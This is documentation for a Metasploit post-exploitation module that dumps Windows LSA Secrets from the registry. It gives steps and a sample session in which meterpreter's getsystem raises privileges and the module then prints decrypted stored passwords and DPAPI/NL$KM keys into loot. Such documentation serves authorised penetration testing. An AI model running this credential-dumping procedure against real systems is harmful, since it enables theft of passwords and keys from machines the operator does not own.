## Vulnerable Application

This module will attempt to enumerate the LSA Secrets keys within the registry. The registry value used is:
`HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets\\`.

## Verification Steps

1. Start msfconsole
1. Get a shell on a Windows computer, with `SYSTEM` privs.
1. Do: `use post/windows/gather/lsa_secrets`
1. Do: `set session #`
1. Do: `run`
1. You should get LSA Secrets.

## Options

### STORE

If the decrypted values should be stored in the database. This is a tradeoff since there is no way to tell if a decrypted
value is a legitamate password, thus you may fill your database with bad values. Default is `true`.

## Scenarios

### Windows 10

The `DefaultPassword` in this case is legitimate.

```
msf6 post(windows/gather/lsa_secrets) > run

[*] Executing module against MSEDGEWIN10
[*] Obtaining boot key...
[*] Obtaining Lsa key...
[*] Vista or above system
[-] Could not retrieve LSA key. Are you SYSTEM?
[*] Post module execution completed
msf6 post(windows/gather/lsa_secrets) > sessions -i 5
[*] Starting interaction with 5...

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > sysinfo
Computer        : MSEDGEWIN10
OS              : Windows 10 (10.0 Build 16299).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > background
[*] Backgrounding session 5...
msf6 post(windows/gather/lsa_secrets) > run

[*] Executing module against MSEDGEWIN10
[*] Obtaining boot key...
[*] Obtaining Lsa key...
[*] Vista or above system
[+] Key: CachedDefaultPassword
 Decrypted Value: f+;=

[+] Key: DefaultPassword
 Decrypted Value: Passw0rd!

[+] Key: DPAPI_SYSTEM
 Decrypted Value: ,l^sx+S?Heo75jnC

[+] Key: NL$KM
 Decrypted Value: @r&qS(o)~fuyOvW+6l5aaX8k<1d_E/d

[*] Writing to loot...
[*] Data saved in: /home/h00die/.msf4/loot/20201011171021_default_192.168.2.92_registry.lsa.sec_067749.txt
[*] Post module execution completed
msf6 post(windows/gather/lsa_secrets) > creds
Credentials
===========

host  origin        service  public  private                          realm  private_type  JtR Format
----  ------        -------  ------  -------                          -----  ------------  ----------
      111.111.1.11                   f+;=                                    Password      
      111.111.1.11                   Passw0rd!                               Password      
      111.111.1.11                   ,l^sx+S?Heo75jnC                        Password      
      111.111.1.11                   @r&qS(o)~fuyOvW+6l5aaX8k<1d_E/d         Password  
```
